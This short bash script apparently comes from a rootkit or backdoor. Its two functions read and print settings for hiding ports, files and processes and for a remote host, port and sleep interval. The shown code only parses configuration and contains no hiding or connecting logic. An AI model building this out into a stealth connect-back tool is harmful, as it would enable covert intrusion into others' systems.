#!/bin/bash

declare br_hide_port
declare br_hide_file
declare br_hide_proc
declare br_remote_host
declare br_remote_port
declare br_sleep_time

function br_load_config()
{
        local arg1 arg2

        while read line
        do
                [ "${line:0:1}" == "#" -a -z "$Line" ] && continue

                arg1=`echo $line | cut -d " " -f 1`
                arg2=`echo $line | cut -d " " -f 2`

                case $arg1 in
                        "HIDE_PORT")
                                br_hide_port=$arg2;;
                        "HIDE_FILE")
                                br_hide_file=$arg2;;
                        "HIDE_PROC")
                                br_hide_proc=$arg2;;
                        "REMOTE_HOST")
                                br_remote_host=$arg2;;
                        "REMOTE_PORT")
                                br_remote_port=$arg2;;
                        "SLEEP_TIME")
                                br_sleep_time=$arg2;;
                esac
        done < $1
}

function br_display_config()
{
        echo -e "HIDE_PORT\t"$br_hide_port
        echo -e "HIDE_FILE\t"$br_hide_file
        echo -e "HIDE_PROC\t"$br_hide_proc
        echo -e "REMOTE_HOST\t"$br_remote_host
        echo -e "REMOTE_PORT\t"$br_remote_port
        echo -e "SLEEP_TIME\t"$br_sleep_time
}
